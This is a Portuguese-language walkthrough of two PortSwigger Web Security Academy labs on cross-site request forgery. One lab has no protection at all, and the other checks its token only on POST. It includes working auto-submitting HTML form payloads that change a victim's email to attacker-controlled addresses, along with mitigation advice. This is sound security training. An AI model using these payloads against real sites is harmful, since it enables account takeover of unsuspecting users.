# Lab: CSRF sem proteção + validação de token dependente do método HTTP

Este write-up reúne dois laboratórios da [PortSwigger Web Security Academy](https://portswigger.net/web-security?utm_source=chatgpt.com) envolvendo vulnerabilidades de **Cross-Site Request Forgery (CSRF)**.

Os labs exploram falhas diferentes:

1. Aplicação sem qualquer proteção CSRF.
2. Aplicação que valida token CSRF apenas em requisições `POST`, permitindo bypass via `GET`.

---

# 📚 Conceitos importantes

CSRF ocorre quando uma aplicação:

* utiliza autenticação baseada em cookie;
* confia automaticamente nas requisições enviadas pelo navegador;
* não valida corretamente a origem da requisição.

O atacante cria uma página maliciosa que força a vítima autenticada a executar ações sem perceber.

---

# 🧪 Lab 1 — CSRF sem proteção

## 🎯 Objetivo

Alterar o endereço de e-mail da vítima utilizando um exploit hospedado no Exploit Server.

---

# 🔍 Identificação da vulnerabilidade

Após autenticar com:

```text
wiener:peter
```

foi interceptada a seguinte requisição:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=...

email=test@gmail.com
```

## Problemas encontrados

A aplicação NÃO validava:

* CSRF Token
* Header `Origin`
* Header `Referer`
* Política `SameSite`

Ou seja:

```text
qualquer site poderia enviar requisições autenticadas em nome da vítima
```

---

# ⚔️ Exploração

Foi criado um formulário HTML contendo a mesma requisição legítima.

## Payload

```html
<html>
  <body>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

# 🧠 Funcionamento

Quando a vítima acessa a página:

1. O JavaScript envia o formulário automaticamente.
2. O navegador inclui o cookie de sessão.
3. O servidor aceita a requisição como legítima.

Resultado:

```text
o e-mail da vítima é alterado
```

---

# ✅ Resolução

Após hospedar o payload no Exploit Server e clicar em:

```text
Deliver to victim
```

o laboratório foi resolvido.

---

---

# 🧪 Lab 2 — Validação CSRF dependente do método HTTP

## 🎯 Objetivo

Explorar uma aplicação que valida CSRF apenas em requisições `POST`.

---

# 🔍 Identificação da vulnerabilidade

A funcionalidade de alteração de e-mail inicialmente utilizava:

```http
POST /my-account/change-email
```

com token CSRF:

```http
csrf=...
```

Ao modificar o token, a aplicação bloqueava a requisição.

Porém, ao converter a requisição para `GET`, foi observado que:

```text
o token CSRF deixava de ser validado
```

Isso permitia bypass completo da proteção.

---

# ⚔️ Exploração

Foi criada uma página maliciosa utilizando método `GET`.

## Payload

```html
<form method="GET"
action="https://<LAB-ID>.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email"
    value="anything@web-security-academy.net">
</form>

<script>
document.forms[0].submit();
</script>
```

---

# ⚠️ Erro encontrado durante exploração

Inicialmente o exploit funcionava ao clicar em:

```text
View exploit
```

mas o laboratório não resolvia após:

```text
Deliver to victim
```

O problema era o valor do e-mail:

```text
anything@web-security-academy.net
```

O laboratório ignora alterações para alguns domínios usados nos exemplos.

Após alterar para outro domínio, como:

```text
pwned@attacker.com
```

o exploit funcionou corretamente.

---

# ✅ Resolução

Após:

1. armazenar o exploit;
2. alterar o e-mail para um domínio válido;
3. clicar em `Deliver to victim`;

o laboratório foi resolvido.

---

# 🛡️ Mitigações

Para prevenir CSRF:

## Implementar CSRF Tokens

Cada ação sensível deve exigir um token único validado no servidor.

---

## Validar métodos HTTP

Nunca permitir ações sensíveis via `GET`.

```text
GET deve ser apenas leitura
```

---

## Validar `Origin` e `Referer`

Garantir que a requisição veio do domínio legítimo.

---

## Utilizar cookies `SameSite`

```http
Set-Cookie: session=...; SameSite=Lax
```

ou:

```http
SameSite=Strict
```

---

# 🧠 Aprendizados

Esses laboratórios demonstram que:

* ausência total de proteção CSRF é crítica;
* validar token apenas em certos métodos HTTP é inseguro;
* requisições `GET` nunca devem modificar estado;
* pequenas falhas de lógica anulam mecanismos de segurança.

---

# 🔗 Referências

* [PortSwigger Web Security Academy - CSRF](https://portswigger.net/web-security/csrf?utm_source=chatgpt.com)
* [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com)
